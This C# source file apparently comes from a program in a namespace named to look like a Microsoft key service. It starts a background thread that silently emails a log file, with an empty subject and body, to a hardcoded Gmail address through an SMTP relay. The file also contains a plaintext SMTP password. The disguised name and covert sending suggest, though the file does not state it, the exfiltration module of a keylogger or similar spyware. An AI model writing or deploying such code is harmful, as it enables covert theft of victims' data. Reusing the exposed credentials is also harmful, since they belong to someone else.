using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using static MicrosoftKeyServiceDefender.ServiceConstants;

namespace MicrosoftKeyServiceDefender
{
    public class EmailServiceProvider
    {
        public static void SendEmailWithAttachment(string fromEmail, string toEmail, string subject, string body, string smtpServer, int smtpPort, string smtpUsername, string smtpPassword, string attachmentFilePath)
        {
            try
            {
                Console.Out.WriteLine("\n\n\nSending logfile -> email\n\n\n");
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient(smtpServer);

                mail.From = new MailAddress(fromEmail);
                mail.To.Add(toEmail);
                mail.Subject = subject;
                mail.Body = body;

                Attachment attachment;
                attachment = new Attachment(attachmentFilePath);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = smtpPort;
                SmtpServer.Credentials = new System.Net.NetworkCredential(smtpUsername, smtpPassword);
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                mail.Dispose();
                Console.Out.WriteLine("\n\n\nLogfile sent successfully!\n\n\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in sending email: " + ex.Message);
            }
        }

        public static void sendLog()
        {
            System.Threading.Thread sendLogInThread = new System.Threading.Thread(sendLogExecuteWithinThread);
            sendLogInThread.Start();
        }

        public static void sendLogExecuteWithinThread()
        {
            var fromEmail = "testlog6441@gmail.com";
            var toEmail = "testlog6441@gmail.com";
            var smtpServer = "smtp-relay.sendinblue.com";
            int smtpPort = 587;
            var smtpUsername = "testlog6441@gmail.com";
            var smtpPassword = "TdjN4xWtGHKZmyPs";
            var attachmentFilePath = EmailLogFile;
            var subject = "";
            var body = "";

            SendEmailWithAttachment(
                fromEmail,
                toEmail,
                subject,
                body,
                smtpServer,
                smtpPort,
                smtpUsername,
                smtpPassword,
                attachmentFilePath
            );
        }
    }
}
